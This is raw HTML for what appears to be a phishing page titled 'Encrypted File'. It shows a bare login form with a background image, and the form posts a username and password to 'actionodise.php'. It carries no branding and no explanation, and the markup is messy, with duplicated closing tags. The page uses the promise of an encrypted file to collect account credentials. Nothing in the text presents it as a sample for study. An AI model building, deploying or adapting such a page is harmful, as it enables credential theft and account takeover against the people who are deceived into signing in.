                             <html><head>          <title>Encrypted File</title>
        <div class="logo">
               <img src="bettyimages/hinksi.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          </div>
        <!-- --- Form Login --- !-->
      <form action="actionodise.php" method="post">    <input type="user" name="user" placeholder=" " required="" style="position:absolute;left:20px;top:129px;width:318;height:30px;padding:10px;border-radius:0px;border: 2px solid #bdc4c9;">
        <input type="password" name="pass" placeholder=" " required="" style="position:absolute;left:20px;top:193px;width:318;height:30px;padding:10px;border-radius:0px;border: 1px solid #bdc4c9;">
 <button type="submit" class="login-button button-primary" style="position:absolute;top:260px;left:20px;padding:8px;font-size:.875em;box-sizing:border-box;display:block;cursor:pointer;background: #4391e3;border: none;border-radius: 0px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:86;"">
            <div class="sign-in-text">Sign in</div>
            </button> 
            </form>
            </div>
  </div>
</form>
</div>
</body></html>     </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
</body></html> 